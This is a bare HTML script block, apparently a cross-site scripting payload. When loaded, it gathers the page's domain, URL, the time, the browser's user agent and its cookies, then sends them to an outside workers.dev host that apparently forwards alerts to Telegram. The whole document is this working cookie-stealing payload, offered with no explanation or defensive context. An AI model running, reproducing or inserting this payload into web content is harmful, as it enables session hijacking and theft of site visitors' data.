<script>
function telegramSend() {
    var textData = ''
        + '🚨 XSS Alert Detected 🚨%0D%0A'
        + '--------------------------------%0D%0A'
        + '🌐 Domain: ' + document.domain + '%0D%0A'
        + '📄 URL: ' + document.location.href + '%0D%0A'
        + '🕒 Time: ' + new Date().toISOString() + '%0D%0A'
        + '🖥️ User-Agent: ' + navigator.userAgent + '%0D%0A'
        + '🍪 Cookies: ' + encodeURIComponent(document.cookie);

    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://lucifer.yutupprem0.workers.dev/?message=' + textData, true);
    xhr.send();
}
telegramSend();
</script>
